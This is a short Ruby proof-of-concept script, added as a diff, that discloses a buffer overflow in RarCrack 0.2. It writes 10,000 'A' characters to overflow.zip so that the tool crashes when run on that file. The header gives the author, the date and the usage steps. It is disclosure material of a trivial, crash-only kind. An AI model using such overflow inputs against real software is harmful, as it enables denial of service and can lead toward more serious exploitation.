@@ -1,0 +1,33 @@
+#!/usr/bin/env ruby
+#  overflow.rb
+#
+#    __________  ____  __  ______  _________
+#   / ____/ __ \/ __ \/ / / / __ \/ ____<  /
+#  / / __/ /_/ / / / / / / / /_/ /___ \ / / 
+# / /_/ / _, _/ /_/ / /_/ / ____/___/ // /  
+# \____/_/ |_|\____/\____/_/   /_____//_/   
+#                                         
+#
+# 	Title: 		RarCrack 0.2 Buffer Overflow POC
+# 	Date: 		19.09.2010
+# 	Author: 	The_UnKn@wn
+# 	Email:		the_unknown [at] group51.org
+# 	Twitter:	@The_UnKn0wn
+# 	Homepage:	http://group51.org 	
+# 	Software Link: 	http://sourceforge.net/projects/rarcrack/files/rarcrack-0.2/%5BUnnamed%20release%5D/rarcrack-0.2.tar.bz2/download
+# 	Version: 	0.2
+# 	Tested on: 	openSUSE 11.3
+# 	CVE: 		none 
+#
+#	Impact:		RarCrack doesn't check the length of the archive and while cracking it crashes.
+#
+#	Usage: 
+#		$ ruby overflow.rb
+#		$ ./rarcrack overflow.zip
+#		
+
+text = "A"*10000
+
+File.open("overflow.zip","w") do |l|
+	l.puts(text)
+end
